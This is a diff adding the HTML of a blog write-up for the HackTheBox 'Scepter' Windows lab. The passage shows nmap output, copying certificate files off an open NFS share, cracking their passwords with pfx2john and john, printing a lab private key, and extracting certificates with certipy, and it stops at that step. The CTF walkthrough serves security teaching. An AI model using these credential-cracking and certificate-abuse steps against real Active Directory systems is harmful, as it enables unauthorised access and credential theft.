@@ -1,0 +1,988 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola v0.21.0" />
+  <title>HackTheBox Scepter Writeup | Dreamer</title>
+  <meta property="og:site_name" content="Dreamer" />
+  <meta property="og:title" content="HackTheBox Scepter Writeup" />
+  <meta name="description" content="The Scepter (Windows - Hard) Box from Hackthebox. Including ADCS ESC9A and ADCS ESC14A abuse with DACL abuse" />
+  <meta property="og:description" content="The Scepter (Windows - Hard) Box from Hackthebox. Including ADCS ESC9A and ADCS ESC14A abuse with DACL abuse" />
+  <meta property="og:url" content="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/" />
+  <link rel="canonical" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2025-07-19T00:00:00+00:00" />
+  <meta property="og:image" content="https://ismailbozkurt.github.io/images/HackTheBox/HTB-Scepter/Pasted_image_20250718054233.png" />
+  <meta property="og:image:alt" content="Reverse engineering and solving the SmileyCTF EasyComeEasyGO challenge binary. Includes Go decompilation, channel logic, and flag calculation." />
+  <meta property="og:image:width" content="300" />
+  <meta property="og:image:height" content="300" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://ismailbozkurt.github.io/atom.xml" title="Dreamer | Atom" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://ismailbozkurt.github.io/main.min.css?h=2e89f7f30f1019877d14" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://ismailbozkurt.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://ismailbozkurt.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://ismailbozkurt.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://ismailbozkurt.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://ismailbozkurt.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://ismailbozkurt.github.io/files/custom.css">
+
+<!-- HEAD END -->
+
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://ismailbozkurt.github.io/" class="text-2xl font-semibold">Dreamer</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://ismailbozkurt.github.io/elasticlunr.min.js", "https://ismailbozkurt.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/infosec_notes"
+          >Infosec-Notes</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/about"
+          >About</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/n2myself"
+          >Note2Myself</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">HackTheBox Scepter Writeup</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2025-07-19T00:00:00+00:00">2025-07-19</time><span
+        class="middot"></span><time
+    datetime="PT0H8M0S">8&nbsp;min</time><span
+      class="middot"></span>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://ismailbozkurt.github.io/images/HackTheBox/HTB-Scepter/Pasted_image_20250718054233.png"
+      alt="Reverse engineering and solving the SmileyCTF EasyComeEasyGO challenge binary. Includes Go decompilation, channel logic, and flag calculation."
+      width="300"
+      height="300"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#nmap-enumeration">NMAP Enumeration</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#network-file-system-enumeration">Network File System Enumeration</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#pkcs12-cracking">PKCS12 Cracking</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#pass-the-cert">Pass The Cert</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#preparation">Preparation</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#bloodhound-analysis">Bloodhound Analysis</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#d-baker-staff-group">D.Baker Staff Group</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#staff-access-certificate-ou">Staff Access Certificate OU</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#attack-path-it-support">Attack Path - IT Support</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#helpdesk-enrollment-certificate-ou">Helpdesk Enrollment Certificate OU</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#certificate-analysis">Certificate Analysis</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#staffaccesscertificate">StaffAccessCertificate</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#helpdeskenrollmentcertificate">HelpdeskEnrollmentCertificate</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#forcechangepassword-acl-abuse">ForceChangePassword ACL Abuse</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#genericall-acl-abuse">genericAll ACL Abuse</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#esc9-explotitation">ESC9 Explotitation</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#1-update-victims-account-upn">1. update victims account upn</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#1-2-update-victim-account-s-email-attribute">1.2 update victim account&#x27;s email attribute</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#2-obtain-newly-created-ccache-ticket">2. Obtain newly created ccache ticket</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#3-request-certificate-via-vulnerable-template">3. Request Certificate via vulnerable template</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#4-restore-victim-account-s-upn">4. Restore victim account&#x27;s upn</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#5-get-nt-hash-via-pfx-file">5. Get NT hash via pfx file</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#esc14a-write-access-on-altsecurityidentities">ESC14A Write Access on altSecurityIdentities</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#what-is-protected-users-group">What is Protected Users Group</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#chaining-the-attack-path">Chaining the Attack Path</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-scepter-writeup/#dcsync-on-dc01-scepter-htb">DCSync on dc01.scepter.htb</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><h2 id="nmap-enumeration">NMAP Enumeration</h2>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">PORT</span><span>     STATE SERVICE       REASON          VERSION
+</span><span style="color:#bf616a;">53/tcp</span><span>   open  domain        syn-ack ttl 127 Simple DNS Plus
+</span><span style="color:#bf616a;">88/tcp</span><span>   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-06 10:26:38Z)
+</span><span style="color:#bf616a;">111/tcp</span><span>  open  rpcbind       syn-ack ttl 127 2-4 (RPC 
+</span><span style="color:#bf616a;">135/tcp</span><span>  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+</span><span style="color:#bf616a;">139/tcp</span><span>  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+</span><span style="color:#bf616a;">389/tcp</span><span>  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+</span><span>|</span><span style="color:#bf616a;">_ssl-date:</span><span> 2025-06-06T10:27:32+00:00; </span><span style="color:#bf616a;">+7h59m58s</span><span> from scanner time.
+</span><span>| </span><span style="color:#bf616a;">ssl-cert:</span><span> Subject: commonName=dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Subject</span><span> Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Issuer:</span><span> commonName=scepter-DC01-CA/domainComponent=scepter
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key type: rsa
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key bits: 2048
+</span><span>| </span><span style="color:#bf616a;">Signature</span><span> Algorithm: sha256WithRSAEncryption
+</span><span style="color:#bf616a;">445/tcp</span><span>  open  microsoft-ds? syn-ack ttl 127
+</span><span style="color:#bf616a;">464/tcp</span><span>  open  kpasswd5?     syn-ack ttl 127
+</span><span style="color:#bf616a;">593/tcp</span><span>  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+</span><span style="color:#bf616a;">636/tcp</span><span>  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+</span><span>| </span><span style="color:#bf616a;">ssl-cert:</span><span> Subject: commonName=dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Subject</span><span> Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Issuer:</span><span> commonName=scepter-DC01-CA/domainComponent=scepter
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key type: rsa
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key bits: 2048
+</span><span>| </span><span style="color:#bf616a;">Signature</span><span> Algorithm: sha256WithRSAEncryption
+</span><span>|</span><span style="color:#bf616a;">_ssl-date:</span><span> 2025-06-06T10:27:33+00:00; </span><span style="color:#bf616a;">+7h59m58s</span><span> from scanner time.
+</span><span style="color:#bf616a;">2049/tcp</span><span> open  nlockmgr      syn-ack ttl 127 1-4 (RPC </span><span style="color:#65737e;">#100021)
+</span><span style="color:#bf616a;">3268/tcp</span><span> open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+</span><span>|</span><span style="color:#bf616a;">_ssl-date:</span><span> 2025-06-06T10:27:32+00:00; </span><span style="color:#bf616a;">+7h59m58s</span><span> from scanner time.
+</span><span>| </span><span style="color:#bf616a;">ssl-cert:</span><span> Subject: commonName=dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Subject</span><span> Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Issuer:</span><span> commonName=scepter-DC01-CA/domainComponent=scepter
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key type: rsa
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key bits: 2048
+</span><span>| </span><span style="color:#bf616a;">Signature</span><span> Algorithm: sha256WithRSAEncryption
+</span><span style="color:#bf616a;">3269/tcp</span><span> open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
+</span><span>| </span><span style="color:#bf616a;">ssl-cert:</span><span> Subject: commonName=dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Subject</span><span> Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Issuer:</span><span> commonName=scepter-DC01-CA/domainComponent=scepter
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key type: rsa
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key bits: 2048
+</span><span>| </span><span style="color:#bf616a;">Signature</span><span> Algorithm: sha256WithRSAEncryption
+</span><span>| </span><span style="color:#bf616a;">Not</span><span> valid before: 2024-11-01T03:22:33
+</span><span>| </span><span style="color:#bf616a;">Not</span><span> valid after:  2025-11-01T03:22:33
+</span><span>| </span><span style="color:#bf616a;">MD5:</span><span>   2af6:88f7:a6bf:ef50:9b84:3dc6:3df5:e018
+</span><span style="color:#bf616a;">5985/tcp</span><span> open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span>|</span><span style="color:#bf616a;">_http-server-header:</span><span> Microsoft-HTTPAPI/2.0
+</span><span>|</span><span style="color:#bf616a;">_http-title:</span><span> Not Found
+</span><span style="color:#bf616a;">5986/tcp</span><span> open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span>|</span><span style="color:#bf616a;">_http-server-header:</span><span> Microsoft-HTTPAPI/2.0
+</span><span>| </span><span style="color:#bf616a;">ssl-cert:</span><span> Subject: commonName=dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Subject</span><span> Alternative Name: DNS:dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Issuer:</span><span> commonName=dc01.scepter.htb
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key type: rsa
+</span><span>| </span><span style="color:#bf616a;">Public</span><span> Key bits: 2048
+</span><span>| </span><span style="color:#bf616a;">Signature</span><span> Algorithm: sha256WithRSAEncryption
+</span></code></pre>
+<p>The <code>nmap</code> result shows nothing interesting except port <code>2049 - nlockmgr</code> .</p>
+<blockquote>
+<blockquote>
+<p>Network File Share Protocol</p>
+<p>The <code>2049</code> port is commonly associated with the NFS (Network File System) service, while <code>nlockmgr</code> (Network Lock Manager) typically operates on a dynamic port assigned by the system, although it can be statically defined for firewalling purposes. <code>nlockmgr</code> is a crucial component of NFS that handles file locking across the network, ensuring that multiple clients don’t overwrite or corrupt shared files during concurrent access. It works in conjunction with the <code>rpc.statd</code> service to maintain lock states, especially during crashes or reboots. Ensuring secure configuration of <code>nlockmgr</code> and NFS is critical, as they can expose systems to remote attacks if improperly secured.</p>
+</blockquote>
+</blockquote>
+<h3 id="network-file-system-enumeration">Network File System Enumeration</h3>
+<p>The NFS expose <code>/helpdesk</code> share. Accessible by <code>everyone</code>.
+Quickly created tempshare folder and than mount <code>/helpdesk</code> into it. Copied my local and than <code>unmount</code> with <code>umount</code> .</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718055617.png" alt="" /></p>
+<h2 id="pkcs12-cracking">PKCS12 Cracking</h2>
+<blockquote>
+<blockquote>
+<p>What is pfx file ?</p>
+<p>A <code>.pfx</code> file, also known as a PKCS#12 file, is a binary format that stores a private key along with the associated public key certificate and, optionally, the certificate chain. Commonly used for importing and exporting certificates and private keys on Windows systems, <code>.pfx</code> files are essential for tasks like enabling HTTPS on web servers, securing email (S/MIME), or client authentication. Because they contain sensitive private key material, <code>.pfx</code> files are typically password-protected and should be stored securely to prevent unauthorized access.</p>
+</blockquote>
+</blockquote>
+<p>When i tried to look pfx files content with <code>openssl</code> , find out the <code>pfx</code> files are password protected.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/…/HackTheBox/machines/scepter/nfsshare]
+</span><span style="color:#bf616a;">└─#</span><span> openssl pkcs12</span><span style="color:#bf616a;"> -info -in</span><span> clark.pfx 
+</span><span style="color:#bf616a;">Enter</span><span> Import Password:
+</span><span style="color:#bf616a;">MAC:</span><span> sha256, Iteration 2048
+</span><span style="color:#bf616a;">MAC</span><span> length: 32, salt length: 8
+</span><span style="color:#bf616a;">Mac</span><span> verify error: invalid password?
+</span><span>
+</span><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/…/HackTheBox/machines/scepter/nfsshare]
+</span><span style="color:#bf616a;">└─#</span><span> openssl pkcs12</span><span style="color:#bf616a;"> -info -in</span><span> lewis.pfx 
+</span><span style="color:#bf616a;">Enter</span><span> Import Password:
+</span><span style="color:#bf616a;">MAC:</span><span> sha256, Iteration 2048
+</span><span style="color:#bf616a;">MAC</span><span> length: 32, salt length: 8
+</span><span style="color:#bf616a;">Mac</span><span> verify error: invalid password?
+</span><span>
+</span><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/…/HackTheBox/machines/scepter/nfsshare]
+</span><span style="color:#bf616a;">└─#</span><span> openssl pkcs12</span><span style="color:#bf616a;"> -info -in</span><span> scott.pfx 
+</span><span style="color:#bf616a;">Enter</span><span> Import Password:
+</span><span style="color:#bf616a;">MAC:</span><span> sha256, Iteration 2048
+</span><span style="color:#bf616a;">MAC</span><span> length: 32, salt length: 8
+</span><span style="color:#bf616a;">Mac</span><span> verify error: invalid password?
+</span><span>
+</span></code></pre>
+<p>To crack <code>pfx</code> files using <code>pfx2john</code> tool for bruteforcable format.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">pfx2john</span><span> nfsshare/clark.pfx &gt; clark.hashes
+</span></code></pre>
+<p>Successfully cracked with old friend <code>john</code> .</p>
+<p><img src="/images/HackTheBox/HTB-Scepter/Pasted_image_20250718060934.png" alt="" /></p>
+<p>Verifying the password is correct</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> openssl pkcs12</span><span style="color:#bf616a;"> -in</span><span> nfsshare/clark.pfx</span><span style="color:#bf616a;"> -nocerts -nodes -passin</span><span> pass:newpassword 
+</span><span style="color:#bf616a;">Bag</span><span> Attributes
+</span><span>    </span><span style="color:#bf616a;">localKeyID:</span><span> E1 84 EA CC 0B 68 19 40 D4 CA 6B 14 C1 8E 9E 30 E7 AA 48 B4 
+</span><span style="color:#bf616a;">Key</span><span> Attributes: &lt;No Attributes&gt;
+</span><span style="color:#bf616a;">-----BEGIN</span><span> PRIVATE KEY-----
+</span><span style="color:#bf616a;">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDdrPemdIl0KT5N
+</span><span style="color:#bf616a;">X3+cS1g3/es5nfAsX7FcmiGmD9kodovcTtOnxLvXCQc4iANb+OeJECO+0CRU3Sph
+</span><span style="color:#bf616a;">DxYLy1Wwv9KAGb1bkQfMsoavUp2eRkhm6IuYKfFzeBSdzfBF86C4k74n28pZRbgW
+</span><span style="color:#bf616a;">1wRg436z7725nWwjcKgz9rZscqBBhcfCs6I9RRJnPRSCR7btyYoE7a8YT0CL/23T
+</span><span style="color:#bf616a;">GSLp5xHflK2IctGunvg1GbdsJ/AtuoyOqhkKHVgFuTOhlzGMx7MNQBuB9jQOd9Oz
+</span><span style="color:#bf616a;">GHwB0/ANPIL5vQpii5GwkMACAMuifHDKVO50ANRPm2oJHWm9YRtpgVDyOIRya/4d
+</span><span style="color:#bf616a;">hDftRqWNAgMBAAECggEAI9NB3Mlls3u84WVHKtu0YKwtOU0QlSNL9zLDsGJMTrFF
+</span><span style="color:#bf616a;">7i9hHnJ5hwmi/JxiqpkB1lFg7YQW8w4hPLli7zoH2b5OhzxhsWwxbgAGK0x3Q66J
+</span><span style="color:#bf616a;">IfSAJvHUXzxvXId9RtjWRy49Y5SuUZomY66ROxVZEzxyFY7e/KVG0csT9VfbFWt7
+</span><span style="color:#bf616a;">3wdzY2KcZpcn+I91Wlhkmojt6iHJdIrTgGdL/GxgcAj1R9lYt87pJGZE/LN45oJD
+</span><span style="color:#bf616a;">JaFh/Wj548RNmO/PkdfWiNnJWrmDiXknbIUeAI1VI43zjxTE3CE4EJ127dGcftsF
+</span><span style="color:#bf616a;">ohlBsm4CkPfGCgtvnEgg+p2mCFKAPMvEvMrWGLEbQwKBgQD7O2YfZfOMa3O8wyFs
+</span><span style="color:#bf616a;">79BDtaXof3qHTQngpagZXI6wFsdrDC21uKV3YlRsqxibQx19ONJWZxAGKGfJYmhr
+</span><span style="color:#bf616a;">0zculbfh0958FT1+9T148bD4I8c0/gHo5MtyK3pT0Srp36Dcr4k0WA+BZ59WGqPw
+</span><span style="color:#bf616a;">NK7vDjbdr++GwDciiBSB4FHHuwKBgQDh4fhQDRXaHZZaniJ1yyAhMqlzA7gm9YwP
+</span><span style="color:#bf616a;">HJNWcde9IE0HTAXdrqgu8FhfBYwoKmILVnVcKOViFspXqoZ8f0SW3jldWuz9xAMj
+</span><span style="color:#bf616a;">/GIWWMvtK8RvfqRBSitKJfPVdTAss7oHx+sd+fdd1OsMuJl13e1GhvORAE+4kur3
+</span><span style="color:#bf616a;">36ZKWNJ/VwKBgGCkFsKZOziW1OyVuzPmhBynsWxgLUgCsHwD/UfUPOcrvAZHpwWy
+</span><span style="color:#bf616a;">Q6RK5OLwZgTDqoJS60ZlWtqjjFkBS92+YAnBefyavYjJuuAtgjoV7tdlG+ock6t8
+</span><span style="color:#bf616a;">523Bn8rCOVnBtmVt+L9z6HME41wB33I1Md2vgBeC6AbTxeG4qvrSyWKlAoGBAISD
+</span><span style="color:#bf616a;">W3gi5RHrT5xjrtWpz3SKUwwtP2hjnsHywqDw8l56R5YjTEGrx/CZgU5lY77gdlou
+</span><span style="color:#bf616a;">Y3UobMEpm5TobjM1OljDj6WrxOJujmUbF7QCbcf6aCf8hIHk8BZ0w2ITeKqQ2W7d
+</span><span style="color:#bf616a;">IpqYXT0HvsjctvKFukAoxVToeNxQHFZENzrgdsTLAoGBANoTOkeaIoSc4C8RyXLS
+</span><span style="color:#bf616a;">XY1UVqQLL2JfMzslc3HtCJru1Mx1C5EumF6qDkbQTnj52cj9/t7DOHqS+9z15Na0
+</span><span style="color:#bf616a;">erilQLHbPqmPt27z04OfKOsXHEgBKGDdvFKBioeZExWTmGkvwt4p0HwwJnxHv4EF
+</span><span style="color:#bf616a;">lI6PhL1ptAhHpO8tAY4frjRx
+</span><span style="color:#bf616a;">-----END</span><span> PRIVATE KEY-----
+</span></code></pre>
+<p>The <code>newpassword</code> also valid for <code>scott.pfx</code> and <code>lewis.pfx</code> files.
+Extract the unprotected <code>pfx</code> files and than try to authenticate.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> certipy cert</span><span style="color:#bf616a;"> -password</span><span> newpassword</span><span style="color:#bf616a;"> -pfx</span><span> nfsshare/clark.pfx</span><span style="color:#bf616a;"> -out</span><span> clark_extracted.pfx
+</span><span style="color:#bf616a;">Certipy</span><span> v5.0.3 - by Oliver Lyak (ly4k)
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Data written to &#39;</span><span style="color:#a3be8c;">clark_extracted.pfx</span><span>&#39;
+</span><span style="color:#bf616a;">[*]</span><span> Writing certificate and private key to &#39;</span><span style="color:#a3be8c;">clark_extracted.pfx</span><span>&#39;
+</span><span>
+</span><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> file clark_extracted.pfx 
+</span><span style="color:#bf616a;">clark_extracted.pfx:</span><span> PEM certificate
+</span><span>
+</span><span style="color:#bf616a;">┌──</span><span>(venv)</span><span style="color:#bf616a;">─</span><span>(root㉿kali2025)</span><span style="color:#bf616a;">-[~/Desktop/HackTheBox/machines/scepter]
+</span><span style="color:#bf616a;">└─#</span><span> less clark_extracted.pfx 
+</span><span>
